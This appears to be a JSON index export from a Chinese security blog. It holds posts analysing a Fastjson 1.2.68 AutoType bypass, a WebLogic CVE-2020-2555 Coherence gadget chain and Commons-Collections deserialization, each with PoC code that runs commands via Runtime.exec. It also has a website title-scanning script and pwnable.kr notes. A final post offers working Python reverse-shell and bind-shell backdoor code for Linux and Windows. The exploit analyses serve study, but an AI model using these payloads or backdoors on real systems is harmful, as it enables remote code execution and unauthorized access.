AutoType\n\n在Fastjson中存在AutoType这个东西，目的是为了防止进行恶意反序列化对象从而导致的安全问题，如果在没有启用AutoType的情况下默认是只有白名单以及一些基础类型可以被反序列化。在fastjson指定了@type后，主要用checkAutoType方法检测是否开了autotype开关。\n\ncheckAutoType主要对传入的expectClass进行了判断，当safeMode模块没有开启时，如果传入的期望类不null,切不在对比的名单中就会将expectClass的值设置为True。\n\n![](/img/media/Fastjson1.68/2020-07-20-14-39-09.png)\n\n随后将传入的类进入白名单对比看是否存在，如果不存在，也就是类属于黑名单，并且autoType开启或者,expectClassFlag的值被设置成true就将类加入缓存中。\n\n![](/img/media/Fastjson1.68/2020-07-20-14-47-00.png)\n\n随后就是一些判断，并将符合条件的类加入到缓存mapping中，fastjson判断autotype的时候会先对mapping的内容进行判断。\n\n根据代码可知经过autotype校验的情况为：\n\n1、白名单里的类\n2、开启了autotype\n3、使用了jsonType注解\n4、指定了期望的类\n5、缓存中的mapping类\n\n本次漏洞利用的就是指定了期望的类,可以看到如果通过了上面的判断，切指定的期望类不为空，就会将该类添加到缓存mapping中并且返回该类的class。查找反序列化expectClass的子类或实现，如果构造方法或setter中含有其它类型可重复第一步构造一个反序列化链，直到找到可以利用的类为止。\n\n## 漏洞分析\n\n前提说到进过autotype的校验有一种情况是输入的类为缓存中的mapping类。可以看到1.2.69修复后expectClass新加的对比类java.lang.AutoCloseable刚好在名单中。\n\n![](/img/media/Fastjson1.68/2020-07-20-15-43-45.png)\n\n当期望类传入切满足autotype的检测判断后会加入mapping类，然而咋在加入map池的前面对传入的期望类进行了判断。\n\n![](/img/media/Fastjson1.68/2020-07-20-15-48-10.png)\n\n这里我们可以看到isAssignableFrom()这样一个方法，这个方法用于判断里面的类是否为继承类。也就是说如果我们利用了java.lang.AutoCloseable这个方法去攻击fastjson，那么后续反序列化的链路一定是要继承于该类的子类。\n\n这里简单抄了一个payload过来进一步分析。\n\n```\npackage fastjsonRce.Fj68;\n\nimport java.io.IOException;\n\npublic class Test implements AutoCloseable{\n\n    public Test(String cmd){\n        try {\n            Runtime.getRuntime().exec(cmd);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    @Override\n    public void close() throws Exception {\n\n    }\n}\n\n```\n\n加载payload,然后在checkAutoType的入口下断点\n\n```\n{\"@type\":\"java.lang.AutoCloseable\", \"@type\":\"fastjsonRce.Fj68.Test\", \"cmd\":\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}\n```\n\n这里可以看到第一次进来解析的类为java.lang.AutoCloseable，由于该类存在与mapping池中，所以期望类为空值。\n\n![](/img/media/Fastjson1.68/2020-07-20-16-01-13.png)\n\n随后将该类进行了反序列化，切该类使用的是JavaBeanDeserializer反序列化器，由于序列化的对象为接口，所以在使用JavaBeanDeserializer会继续解析下一个json字段。\n\n![](/img/media/Fastjson1.68/2020-07-20-16-03-42.png)\n\n可以看到进行了第二次的checkAutoType，并且将java.lang.AutoCloseable作为了其期望类\n\n![](/img/media/Fastjson1.68/2020-07-20-16-09-55.png)\n\n由于新传入的类不在mapping池中，但expectClassFlag的值被设置成了true进入了如下判断。将该类加入到了mapping池中\n\n![](/img/media/Fastjson1.68/2020-07-20-16-16-13.png)\n\n随后进入了expectClass != null的判断。这里的期望类为java.lang.AutoCloseable，因此这也就是之前说的为什么攻击的payload需要继承该类。\n\n随后返回的clazz被赋值为我们的攻击payload Test.class随后使用JavaBeanDeserializer对传入的内容进行了序列化\n\n![](/img/media/Fastjson1.68/2020-07-20-16-23-03.png)\n\n对与该方法的利用还有一个处罚点就是浅蓝师傅最开始说的ThrowableDeserializer，由于该方法是抛出异常时处罚的，切没有开发人员会将执行命令，lookup等方法写到异常处理的地方，因此这个方法不适用于寻找gadget。这里也将主要存在点附上，代码没截全有兴趣的可以自行探索。\n\n![](/img/media/Fastjson1.68/2020-07-20-16-38-21.png)\n\n\n## 总结\n\n对于该反序列化的挖取其方法需要继承java.lang.AutoCloseable、java.lang.Runnable、java.lang.Readable中的一个类，但是其中部分类的使用被做了限制：\n\n![](/img/media/Fastjson1.68/2020-07-20-16-43-18.png)\n\n如果类继承与上面几种接口，则会直接抛出异常。\n\n另外一种思路就是根据[浅蓝师傅的文章](https://b1ue.cn/archives/382.html)去寻找文件读写。\n\n\n","tags":["JAVA"]},{"title":"CVE-2020-2555 反序列化分析","url":"/2020/06/15/CVE-2020-2555 反序列化分析/","content":"\n## 前言\n\n该洞主要是webloigc的coherence.jar存在可以构造反序列化的gadget类，通过T3协议处理后导致漏洞触发，本文主要是学习weblogicT3序列化，并构造利用链的过程。\n\t\n\n## 利用链分析\n\n通过网上公布的poc，得知利用链如下：\n\n```\n gadget:\n      BadAttributeValueExpException.readObject()\n          com.tangosol.util.filter.LimitFilter.toString()\n              com.tangosol.util.extractor.ChainedExtractor.extract()\n               \tcom.tangosol.util.extractor.ReflectionExtractor.extract()\n                     Method.invoke()\n                     ...\n                     Runtime.getRuntime.exec()\n```\n\npoc\n```\nValueExtractor[] valueExtractors = new ValueExtractor[]{\n                new ReflectionExtractor(\"getMethod\", new Object[]{\n                        \"getRuntime\", new Class[0]\n                }),\n                new ReflectionExtractor(\"invoke\", new Object[]{null, new Object[0]}),\n                new ReflectionExtractor(\"exec\", new Object[]{new String[]{command}})\n        };\n\n        //初始化LimitFiler类实例\n        LimitFilter limitFilter = new LimitFilter();\n        limitFilter.setTopAnchor(Runtime.class);\n        BadAttributeValueExpException expException = new BadAttributeValueExpException(null);\n        Field m_comparator = limitFilter.getClass().getDeclaredField(\"m_comparator\");\n        m_comparator.setAccessible(true);\n        m_comparator.set(limitFilter, new ChainedExtractor(valueExtractors));\n        Field m_oAnchorTop = limitFilter.getClass().getDeclaredField(\"m_oAnchorTop\");\n        m_oAnchorTop.setAccessible(true);\n        m_oAnchorTop.set(limitFilter, Runtime.class);\n        //将limitFilter放入BadAttributeValueExpException的val属性中\n        Field val = expException.getClass().getDeclaredField(\"val\");\n        val.setAccessible(true);\n        val.set(expException, limitFilter);\n```\n\n首先查看ReflectionExtractor.extract()方法：\n\n```\npublic E extract(T oTarget) {\n        if (oTarget == null) {\n            return null;\n        } else {\n            Class clz = oTarget.getClass();\n\n            try {\n                Method method = this.m_methodPrev;\n                if (method == null || method.getDeclaringClass() != clz) {\n                    this.m_methodPrev = method = ClassHelper.findMethod(clz, this.getMethodName(), ClassHelper.getClassArray(this.m_aoParam), false);\n                }\n\n                return method.invoke(oTarget, this.m_aoParam);\n            } catch (NullPointerException var4) {\n                throw new RuntimeException(this.suggestExtractFailureCause(clz));\n            } catch (Exception var5) {\n                throw ensureRuntimeException(var5, clz.getName() + this + '(' + oTarget + ')');\n            }\n        }\n    }\n```\n\n可以看到这里return了一个method.invoke()，进一步构造代码如下。\n\t\n```\nRuntime runtime = Runtime.getRuntime();\n                ReflectionExtractor reflectionExtractor = new ReflectionExtractor(\"exec\",new String[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"});\n                reflectionExtractor.extract(runtime);\n```\n\n![image-20200526161740955](/img/media/CVE-2020-2555/image-20200526161740955.png)\n\n可以利用该代码直接弹出cmd，ReflectionExtractor() 这个方法设置了method和invoke的方法。poc最开使得代码类似于CommonsCollections5的transform都是做了一个this.method的赋值。\n\n![image-20200526161010089](/img/media/CVE-2020-2555/image-20200526161010089.png)\n\n\n但是只有触发extract()方法时，该反射调用的最终方法才会被执行。这里根据payload，进一步跟入，查看LimitFilter类的toString()方法\n\n```\npublic String toString() {\n        StringBuilder sb = new StringBuilder(\"LimitFilter: (\");\n        sb.append(this.m_filter).append(\" [pageSize=\").append(this.m_cPageSize).append(\", pageNum=\").append(this.m_nPage);\n        if (this.m_comparator instanceof ValueExtractor) {\n            ValueExtractor extractor = (ValueExtractor)this.m_comparator;\n            sb.append(\", top=\").append(extractor.extract(this.m_oAnchorTop)).append(\", bottom=\").append(extractor.extract(this.m_oAnchorBottom));\n        } else if (this.m_comparator != null) {\n            sb.append(\", comparator=\").append(this.m_comparator);\n        }\n\n        sb.append(\"])\");\n        return sb.toString();\n    }\n```\n\n这里可以看到在LimitFilter的toString()方法中之只要满足判断this.m_comparator的值属于ValueExtractor类就能进行对extract()方法的调用。而reflectionExtractor刚好属于ValueExtractor类\n\n构造测试代码\n\n```\nRuntime runtime = Runtime.getRuntime();\n                ReflectionExtractor reflectionExtractor = new ReflectionExtractor(\"exec\",new String[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"});\n//                reflectionExtractor.extract(runtime);\n                LimitFilter limitFilter = new LimitFilter();\n                // 将reflectionExtractor赋值给this.m_comparator\n                limitFilter.setComparator(reflectionExtractor);\n                // 将runtime赋值给this.m_oAnchorTop\n                limitFilter.setTopAnchor(runtime);\n                // 这里相当于调用了ValueExtractor extractor = (ValueExtractor) reflectionExtractor\n                // extractor.extract(runtime)\n                limitFilter.toString();\n```\n\n这里相当于执行了第一个测试代码的reflectionExtractor.extract(runtime);这里整个invoke反射链就完成了，接下来是如何进行readObject的。\n\n这里可以看到这个BadAttributeValueExpException和CommonsCollections5使用的反序列化方法是一样的。\n执行BadAttributeValueException.readObject前，把val赋值为LimitFilter这个类就回调用toString方法，而LimitFilter.toString()刚好形成之前的反射链。\n\n```\nBadAttributeValueExpException expException = new BadAttributeValueExpException(null);\n// 获取私有变量值val\nField val = expException.getClass().getDeclaredField(\"val\");\n// 设置访问标志为true使其可以访问私有变量\nval.setAccessible(true);\nval.set(expException, limitFilter);\n```\n\nBadAttributeValueException的readObject方法\n\n```\nprivate void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {\n        ObjectInputStream.GetField gf = ois.readFields();\n        Object valObj = gf.get(\"val\", null);\n\n        if (valObj == null) {\n            val = null;\n        } else if (valObj instanceof String) {\n            val= valObj;\n        } else if (System.getSecurityManager() == null\n                || valObj instanceof Long\n                || valObj instanceof Integer\n                || valObj instanceof Float\n                || valObj instanceof Double\n                || valObj instanceof Byte\n                || valObj instanceof Short\n                || valObj instanceof Boolean) {\n            val = valObj.toString();\n```\n\n![image-20200526164610226](/img/media/CVE-2020-2555/image-20200526164610226.png)\n\n至此整个反序列化完成\n```\nRuntime runtime = Runtime.getRuntime();\n                ReflectionExtractor reflectionExtractor = new ReflectionExtractor(\"exec\",new String[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"});\n//                reflectionExtractor.extract(runtime);\n                LimitFilter limitFilter = new LimitFilter();\n                // 将reflectionExtractor赋值给this.m_comparator\n                limitFilter.setComparator(reflectionExtractor);\n                // 将runtime赋值给this.m_oAnchorTop\n                limitFilter.setTopAnchor(runtime);\n                // 这里相当于调用了ValueExtractor extractor = (ValueExtractor) reflectionExtractor\n                // extractor.extract(runtime)\n//                limitFilter.toString();\n                BadAttributeValueExpException expException = new BadAttributeValueExpException(null);\n                // 获取私有变量值val\n                Field val = expException.getClass().getDeclaredField(\"val\");\n                // 设置访问标志为true使其可以访问私有变量\n                val.setAccessible(true);\n                val.set(expException, limitFilter);\n```\n\n使用此条链会出现如下报错是因为Runtime这个类没实现序列化接口。原理已经搞清楚了修改一下poc就可以利用了。\n\n![image-20200526170031346](/img/media/CVE-2020-2555/image-20200526170031346.png)","tags":["JAVA"]},{"title":"JAVA反序列化分析之Apache-Commons-Collections","url":"/2019/07/17/JAVA反序列化分析之Apache-Commons-Collections/","content":"\n## Transformer\n\n该类里的transform方法将一个对象转化为另一个对象.如Runtime.class经过transform转化输出结果为class java.lang.Class\n\n![Pasted Graphi](/img/media/Apache-Commons-Collections/Pasted%20Graphic.png)\n\n## InvokerTransformer\n\n通过查看InvokerTransformer的源码可以看出该类是通过反射创建一个新的对象实例.该类使用了transform接口如图所示：\n![Pasted Graphic 1](/img/media/Apache-Commons-Collections/Pasted%20Graphic%201.png)\n\ncls获取传递进来的input对象值，例如传入runtime对象\n\ncls.getMethod   以及method.invoke是利用java反射机制反射Runtime的getRuntime方法。\n\niMethodName表示得到的方法名， iParamTypes表示方法中使用的参数类型的数组\n![Pasted Graphic 2](/img/media/Apache-Commons-Collections/Pasted%20Graphic%202.png)\n\n通过InvokerTransformer反射出了java.lang.Runtime.getRuntime()\n![Pasted Graphic 3](/img/media/Apache-Commons-Collections/Pasted%20Graphic%203.png)\n\n执行命令的整个调用连为 java.lang.Runtime..getRuntime().invoke().exec()\n可以通过该方式逐步调用：\n![Pasted Graphic 4](/img/media/Apache-Commons-Collections/Pasted%20Graphic%204.png)\n\n成功代码执行\n![Pasted Graphic 5](/img/media/Apache-Commons-Collections/Pasted%20Graphic%205.png)\n\n上述是整个反射链的过程\n\n## ChainedTransformer\n![Pasted Graphic 6](/img/media/Apache-Commons-Collections/Pasted%20Graphic%206.png)\n\n可以看出该类重构了transform方法，将我们之前的调用链简化到一个方法中通过创建的Transformers数组循环反射执行。\n\n如何构造出Runtime对象类型呢？\n\n## ConstantTransformer\n![Pasted Graphic 7](/img/media/Apache-Commons-Collections/Pasted%20Graphic%207.png)\n\n可以看出该类对transformer重构，返回一个iConstant变量，该变量在ConstantTransformer(Object)方法中被赋值。\n![Pasted Graphic 8](/img/media/Apache-Commons-Collections/Pasted%20Graphic%208.png)\n![Pasted Graphic 9](/img/media/Apache-Commons-Collections/Pasted%20Graphic%209.png)\n\n内部构造出了Runtime的对象类型\n\n构造poc\n![Pasted Graphic 10](/img/media/Apache-Commons-Collections/Pasted%20Graphic%2010.png)\n\n成功执行\n![Pasted Graphic 11](/img/media/Apache-Commons-Collections/Pasted%20Graphic%2011.png)\n\n## TransformedMap\n\n该类实现了一个功能——将普通的Map转换为一个TransformedMap，可以通过该类绕过transform方法。\n![Pasted Graphic 12](/img/media/Apache-Commons-Collections/Pasted%20Graphic%2012.png)\n\nKeyTransfomer 表示key改变的操作  valueTransformer表示value改变时的操作\n![Pasted Graphic 13](/img/media/Apache-Commons-Collections/Pasted%20Graphic%2013.png)\n\n从这里可以看出 value是可控的，在decorate中赋值即可，于是有如下利用代码：\n![Pasted Graphic 14](/img/media/Apache-Commons-Collections/Pasted%20Graphic%2014.png)\n\n通过TransformedMap代替transform生成如下代码：\n![Pasted Graphic 15](/img/media/Apache-Commons-Collections/Pasted%20Graphic%2015.png)\n\n成功弹出计算器：\n![Pasted Graphic 16](/img/media/Apache-Commons-Collections/Pasted%20Graphic%2016.png)\n\n至此我们获取了一个完整的poc，剩下需要找一个可重写readObject方法的类并且调用了对map值进行修改操作。\n\n在ysoserial反序列化工具利用的是 BadAttributeValueExpException 查看代码如下：\n![Pasted Graphic 19](/img/media/Apache-Commons-Collections/Pasted%20Graphic%2019.png)\n\n该代码重构了readObject方法，如果传入类型为map类型，则会调用map.toString()方法。这里并没有对map的key值进行修改操作，于是需要利用LazyMap,TiedMapEntry两个类来构造\nLazyMap：尝试访问key的value如果key不在会把值put进去\n![Pasted Graphic 20](/img/media/Apache-Commons-Collections/Pasted%20Graphic%2020.png)\n\nTiedMapEntry：会把map和一个key进行绑定\n![Pasted Graphic 21](/img/media/Apache-Commons-Collections/Pasted%20Graphic%2021.png)\n\n利用LazyMap创建map对象，通过decotate方法设transfomer时的transformChain然后通过TiedMapEntry将map与不存在的key绑定，进而利用BadAttributeValueExpException创建一个map进行赋值。但是val是私有属性的，需要进行setAccessible(true)来访问私有变量。\n\n至此完成整个exp编写：\n![Pasted Graphic 22](/img/media/Apache-Commons-Collections/Pasted%20Graphic%2022.png)\n\n## 参考链接\n\nhttps://security.tencent.com/index.php/blog/msg/97\n\nhttps://www.freebuf.com/news/150872.html\n\nhttp://pupiles.com/java_unserialize2.html","tags":["JAVA"]},{"title":"Title批量获取工具","url":"/2019/04/20/Title批量获取工具/","content":"\n## 批量快速获取Title、server信息工具\n\n使用方法：将需要获取的网站链接列表保存在工具目录下的1.txt中，运行脚本。此脚本会时时输出在控制台中，运行完毕后所有信息全部输入到本地生成的output.xls文件中。如果有建议可以评论提交本人修改。\n\n```\n'''\ntitle快速获取工具  \n保存需要获取的ip到本地txt文件直接运行即可\n'''\nimport requests\nimport threading\nimport re, xlwt, random\n\n#proxies = {'http': 'http://127.0.0.1:8080'}\nThreadList = []   # 线程列表\nrunList = []      # 运行线程列表\nFileList = []     # 网站链接列表\nOutList = []      # 输出数据列表\nlock = threading.Lock()\n\n# 随机agent\ndef requests_headers():\n    user_agent = [\n        'Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.1) Gecko/20061010 Firefox/2.0',\n        'Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.6 Safari/532.0',\n        'Mozilla/5.0 (Windows; U; Windows NT 5.1 ; x64; en-US; rv:1.9.1b2pre) Gecko/20081026 Firefox/3.1b2pre',\n        'Opera/10.60 (Windows NT 5.1; U; zh-cn) Presto/2.6.30 Version/10.60',\n        'Opera/8.01 (J2ME/MIDP; Opera Mini/2.0.4062; en; U; ssr)',\n        'Mozilla/5.0 (Windows; U; Windows NT 5.1; ; rv:1.9.0.14) Gecko/2009082707 Firefox/3.0.14',\n        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36',\n        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',\n        'Mozilla/5.0 (Windows; U; Windows NT 6.0; fr; rv:1.9.2.4) Gecko/20100523 Firefox/3.6.4 ( .NET CLR 3.5.30729)',\n        'Mozilla/5.0 (Windows; U; Windows NT 6.0; fr-FR) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16',\n        'Mozilla/5.0 (Windows; U; Windows NT 6.0; fr-FR) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5'\n    ]\n    UA = random.choice(user_agent)\n    headers = {\n        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',\n        'User-Agent':UA,\n        'Upgrade-Insecure-Requests':'1',\n        'Connection':'keep-alive',\n        'Cache-Control':'max-age=0',\n        'Accept-Encoding':'gzip, deflate, sdch',\n        'Accept-Language':'zh-CN,zh;q=0.8',\n        \"Referer\": \"http://www.baidu.com/link?url=www.so.com&url=www.soso.com&&url=www.sogou.com\"\n    }\n    return headers\n\n# 多线程获取页面信息\nclass MyThread(threading.Thread):\n    def __init__(self, ip):\n        threading.Thread.__init__(self)\n        self.ip = ip\n\n    def run(self):\n        if self.ip[0:4] != 'http':\n            self.ip = 'http://' + self.ip\n        try:\n            headers = requests_headers()\n            r = requests.get(url=self.ip, headers=headers ,timeout=5, proxies=False)\n            if r.text.find('charset=utf-8') >= 0:\n                r.encoding = 'utf-8'\n            title = re.findall(r'<title>(.*?)</title>', r.text)[0]\n            lock.acquire(timeout=1)\n            print([self.ip,title,r.headers['Server']])\n            OutList.append([self.ip, title ,r.headers['Server']])\n            lock.release()       \n        except:\n            pass\n\n\ndef OpenFile():\n    f = open('1.txt','r')\n    for i in f.readlines():\n        FileList.append(i.strip())\n    f.close()\n    GetInfo(FileList)\n\ndef GetInfo(FileList):\n    taskNum = 0\n    for i in FileList:\n        t = MyThread(i)\n        ThreadList.append(t)\n    for t in ThreadList:\n        t.setDaemon(True)\n        t.start()\n        runList.append(t)\n        taskNum += 1\n        while taskNum > 19:\n            for t in runList:\n                if t.isAlive() == False:\n                    runList.remove(t)\n                    taskNum -= 1\n    OutPut(OutList)\n\ndef OutPut(OutList):\n    workbook = xlwt.Workbook(encoding='utf-8')\n    worksheet = workbook.add_sheet('result')\n    for i in range(0,3):\n        worksheet.col(i).width = 10000\n    worksheet.write(0,0, label='网站链接')\n    worksheet.write(0,1, label='网站标题')\n    worksheet.write(0,2, label='Server信息')\n    #worksheet.write(0,3, label='Web指纹')\n    for i in range(1,len(OutList)):\n        output = OutList[i]\n        worksheet.write(i,0, label=output[0])\n        worksheet.write(i,1, label=output[1])\n        worksheet.write(i,2, label=output[2])\n    workbook.save('output.xls')\n\ndef main():\n    OpenFile()\n\nif \"__main__\" == __name__:\n    main()\n\n```","tags":["安全工具"]},{"title":"pwable.rk题目相关知识(不定期更新)","url":"/2019/04/01/pwable-rk题目相关知识不定期更新/","content":"\n## Fd\n\n1、标准输入输出和错误\n\nlinux下使用标准输入文件stdin和标准输出文件stdout，来表示每个命令的输入和输出，还使用标准错误输出文件stderr用于输出错误信息。三个标准流都与系统与控制终端设备相连(如:键盘)。\n\n因此，在标准情况下，每个命令通常从相应的控制终端中获取输入，并将输出打印到控制终端屏幕上，如本题解题过程。也可以将程序重新定义，将stdin，stdout重定向。最基本的使用方法是定义到一个文件上，从一个文件获取输入，输出到另外的文件中。如read()，write()函数的使用。\n\n2、文件描述符\n\n在底层操作系统是不会通过文件指针来查找文件的，而是通过文件表示符来操作的。\n\n文件标识符以一系列证书，从0开始依次递增。但是一般系统标识符都是从3开始的。\n\n文件描述符0、1、2和终端相关。如果希望命令从文件中读取输入或输出到文件中，就需要使用文件重定向。\n\n系统默认打开三个流：\n\n| 文件描述符| 缩写 | 描述 |\n| :-: | :-: | :-: |\n| 0 | stdin | 标准输入(命令的输入，缺省和终端键盘关联) |\n| 1 | stdout | 标准输出(命令的输出，缺省和终端屏幕关联) |\n| 2 | stderr | 标准错误输出(命令的错误信息输出，缺省和终端屏幕关联) |\n\n3、重定向标准输出\n\n```\nwhoami > filename  #把命令标准输出重定向到一个文件中(如果文件存在，则内容覆盖)\nwhoami >> filename # 把命令标准输出重定向到文件中(尾部追加)\n```\n\n4、重定向标准输入\n\n```\nwhoami < filename  # 以filename文件作为命令whoami的标准输入\nwhoami << DELIMITER # 从标准输入中读入输入，直到遇到DELIMITER分解符\n```\n\n5、重定向标准错误\n\n```\nwhoami 2> filename # 把whoami命令的标准错误重定向到文件中(如果文件存在，则内容覆盖)\nwhoami >> filename # 把命令的标准错误重定向到文件中(尾部追加)\n```\n\n## collision\n\n1、\\xc9 为字符串。使用python print后会输出？是因为计算机不识别的这个字符\n\n2、大端序 or 小端序\n    端序：又称字节序、尾序、位序。在计算机领域是指机器存放多字节数据的字节顺序。在涉及到低层数据存储和网络数据传输研究中都会涉及端序。\n    大端序：高位字节放在内存的低地址，低位字节放在内存的高地址。\n    小端序：低位字节放在内存的低地址，高位字节放在内存的高地址。\n    例：int a = 0x12345678  从左到右字节位降低 两个数为一个字节 12是高位78是低位，字节位具有相对性。\n```\n    大端序存放方式：\n    0x00000001           -- 12\n    0x00000002           -- 34\n    0x00000003           -- 56\n    0x00000004           -- 78 \n    地址位从低到高，字节位从高到低\n    小端序存放方式：\n    0x00000001           -- 78\n    0x00000002           -- 56\n    0x00000003           -- 34\n    0x00000004           -- 12 \n    地址位从低到高，字节位从低到高\n```\n\n3、lsb文件基本都是小端序文件\n\n## bof\n\n1、gets(s)存在溢出\n    scanf遇到输出不能有空格，所以用gets输入字符串，但是gets出现了一个潜在问题，gets将不停地往s中塞东西，不管s的可用空间是否足够，就存在溢出漏洞问题，超过s空间长度会导致系统崩溃。\n\n2、esp汇编中为栈顶置针，栈中数据都是从栈顶进入的。\n\n| 栈顶 |\n| --- |\n| esp |\n| ... |\n| s |\n| ... |\n| ebp |\n| 返回地址 |\n| arg0 | \n\nesp = s + ebp(4字节) + 返回地址(4)\n\n\n## flag\n\nupx压缩文件\n```\nupx -d file  #upx解压文件\n```\n\n## passcode\n\n1、scanf(\"%d\", &a)\nscanf函数会把获取的值送到一个地址，如果不加&会把a的值当作地址传送。\n\n\n待更新...\n","tags":["pwn"]},{"title":"Python Shell","url":"/2018/09/20/Python-Shell/","content":"\n## Python反向链接后门\n\n```\nimport socket, subprocess, os\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM\ns.connect((host,port))\nos.dup2(s.fileno(),0) # 0代表系统的stdin\nos.dup2(s.fileno(),1) # 1代表系统的stdout\nos.dup2(s.fileno(),2) # 2代表系统的stderr\np=subprocess.call([\"/bin/sh\",\"-i\"])\n```\n\n## Python正向链接后门\n\n1. windows正向链接CmdShell\n\n```\nfrom socket import *\nimport subprocess\nimport os, threading\n\ndef send(talk, proc):\n        import time\n        while True:\n                msg = proc.stdout.readline()\n                talk.send(msg)\n                \nserver=socket(AF_INET,SOCK_STREAM)\nserver.bind(('0.0.0.0',port))\nserver.listen(5)\ntalk, addr = server.accept()\nprint(\"connecting \", addr)\nproc = subprocess.Popen('cmd.exe /K', stdin=subprocess.PIPE,\n                stdout=subprocess.PIPE, stderr=subprocess.PIPE,\n                shell=True)\nt = threading.Thread(target = send, args = (talk, proc))\nt.setDaemon(True)\nt.start()\nwhile True:\n    cmd=talk.recv(1024)\n    proc.stdin.write(cmd)\n    proc.stdin.flush()\nserver.close()\n```\n\n2. linux版/bin/sh\n\n```\nfrom socket import *\nimport subprocess\nimport os, threading, sys\n\nserver=socket(AF_INET,SOCK_STREAM)\nserver.bind(('0.0.0.0',port))\nserver.listen(5)\ntalk, addr = server.accept()\nprint(\"connecting \", addr)\nproc = subprocess.Popen([\"/bin/sh\",\"-i\"], stdin=talk,\n                        stdout=talk, stderr=talk, shell=True)\n\n```\n\n","tags":["python"]}]